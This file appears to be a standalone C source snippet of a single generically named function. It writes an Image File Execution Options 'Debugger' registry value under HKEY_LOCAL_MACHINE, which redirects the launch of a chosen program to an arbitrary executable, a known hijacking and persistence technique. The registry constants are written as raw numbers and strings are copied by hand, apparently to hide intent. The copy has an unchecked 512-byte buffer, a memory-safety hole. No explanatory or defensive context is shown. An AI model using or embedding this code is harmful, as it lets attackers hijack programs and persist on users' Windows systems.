#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v2(const char* t, const char* d){
    HKEY k;
    char b[512];
    char* p = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\";
    int i = 0;
    while(*(p+i)) { *(b+i) = *(p+i); i++; }
    int j = 0;
    while(*(t+j)) { *(b+i+j) = *(t+j); j++; }
    *(b+i+j) = 0;
    if (RegCreateKeyExA((HKEY)0x80000002, b, 0, 0, 0, 0x2, 0, &k, 0) == 0) {
        int l = 0;
        while(*(d+l)) l++;
        RegSetValueExA(k, "Debugger", 0, 1, (const BYTE*)d, l);
        RegCloseKey(k);
    }
}